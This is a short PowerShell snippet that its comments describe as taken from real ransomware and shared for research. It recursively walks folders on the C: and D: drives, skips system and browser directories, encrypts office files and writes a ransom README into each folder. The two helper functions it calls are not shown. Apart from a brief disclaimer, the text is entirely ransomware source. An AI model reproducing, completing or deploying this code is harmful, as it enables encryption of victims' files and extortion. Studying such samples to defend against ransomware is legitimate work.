// THIS CODE SAMPLE WAS TAKEN FROM REAL RANSOMWARE AND IS PROVIDED HERE ONLY FOR RESEARCH NEEDS !!!
// TO STOP RANSOMWARE WE NEED TO KNOW HOW IT WORKS INSIDE
// DON'T USE ANY OF THIS CODE SAMPLES FOR ANY CRIMINAL ACTIVITIES!

function GetDListFD($dirname) {
try {return Get-ChildItem -Directory $dirname | Select-Object Name -ExpandProperty Name | Where-Object {$_ -ne 'Chrome' -and $_ -ne 'Mozilla' -and $_ -ne 'Program Files' -and $_ -ne 'Program Files (x86)' -and $_ -ne 'Windows' -and $_ -ne 'Program Data'}
} catch {return "";}}

function CryptDir($drnam) {
try {$llfl = GetAllOfficeFilesForDir($drnam);
if ($llfl.count -ge 1) {
foreach ($file in $llfl) {
$fpath = $drnam+'\'+$file;
EncryptFile($fpath);}
$readmef = $drnam+'\README.txt';
sc -path $readmef -value 'HERE AN ATTACKER PUTS SOME MESSAGE FOR THE VICTIM WITH REQUEST OF RANSOM';
}} catch {}
try {
$lldl = GetDListFD($drnam);
foreach ($d in $lldl) {
CryptDir($drnam+'\'+$d);}} catch {}
}

CryptDir('c:\');
CryptDir('d:\');

